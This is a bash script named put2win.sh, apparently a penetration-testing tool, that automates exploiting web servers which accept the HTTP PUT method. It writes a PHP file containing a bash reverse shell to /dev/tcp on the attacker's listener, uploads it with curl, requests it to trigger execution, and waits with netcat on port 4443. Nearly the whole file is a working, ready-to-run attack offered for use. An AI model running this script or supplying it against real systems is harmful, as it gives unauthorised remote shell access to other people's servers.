#!/bin/bash        
#title          :put2win.sh
#description    :Script to automate PUT HTTP method exploitation to get shell.
#author         :@devploit (https://github.com/sysdevploit/)
#version        :0.2    
#usage          :./put2win.sh -t TARGET [-p PORT] -u URL_PATH -l LHOST [-s SHELLNAME]
#====================================================================================================

# --- initial arguments ---
rhost=0
rport=80
path=/
lhost=0
shellname=license.php

# --- colors ---
RED="\033[1;31m"
GREEN="\033[1;32m"
BLUE="\033[1;34m"
NOCOLOR="\033[0m"

# --- banner ---
echo -e "${RED}               ___________          _____        "
echo "____________  ___  /__|__ \__      ____(_)______ "
echo "___  __ \  / / /  __/___/ /_ | /| / /_  /__  __ \  "
echo "__  /_/ / /_/ // /_ _  __/__ |/ |/ /_  / _  / / /"
echo "_  .___/\__,_/ \__/ /____/____/|__/ /_/  /_/ /_/ "
echo "/_/ "
echo -e "		   		    @devploit${NOCOLOR}"
 
# --- usage ---
display_usage() { 
	echo -e "\nScript to automate PUT HTTP method exploitation to get shell." 
	echo -e "\nOptions:\n  -t TARGET        Target URL/IP (e.g. "192.168.1.10") \n  -p PORT          Target PORT (e.g. "8080") \n  -u URL PATH      Path to save the shell (e.g. "/uploads")  \n  -l LOCAL IP      IP where the shell will connect (e.g. "192.168.1.5") \n  -s SHELL NAME    Shell name (e.g. "license.php")" 
	echo -e "\nExamples of use:\n - ./put2win.sh -t 192.168.1.80 -u /uploads -l 192.168.1.10 -s readme.php"
	echo -e " - ./put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10\n"
	} 

# --- arguments ---
while getopts 't:p:u:l:s:h' arg;
do
    case $arg in
    	t) rhost=$OPTARG ;;
	p) rport=$OPTARG ;;
	u) path=$OPTARG ;;
	l) lhost=$OPTARG ;;
	s) shellname=$OPTARG ;;
	h) display_usage ;;
	esac
done

# --- requirements installed ---
for p in nmap msfvenom; do
	if hash "$p" &>/dev/null
	then
		break
	else
		echo "$p is not installed"
    	exit 1
    fi
done 

# --- if arguments are less than three: display usage and exit ---
if [ $# -le 3 ] 
then 
	exit 1
fi 

# --- main ---
if [ -e $shellname ]
then
	rm -r $shellname
fi

echo -e "${BLUE}[+] Creating reverse shell...${NOCOLOR}"
echo -e "<?php" > $shellname
echo -e "exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$lhost/4443 0>&1'\");" >> $shellname
echo -e "${GREEN}[+] Reverse shell '$shellname' created!${NOCOLOR}"

echo -e "${BLUE}[+] Uploading shell to $rhost:$rport...${NOCOLOR}"
curl=$(curl -v -T $shellname http://$rhost:$rport 2>&1 | grep Continue) 
if [ -z "$curl" ]
then
	echo -e "${RED}[-] Shell has not been uploaded${NOCOLOR}"
	exit 1
fi

echo -e "${GREEN}[+] Shell succesfully uploaded to http://$rhost:$rport$path/$shellname !${NOCOLOR}"
echo -e "${BLUE}[+] Waiting to a reverse connection...${NOCOLOR}"

curl http://$rhost:$rport$path/$shellname &
nc -lvp 4443
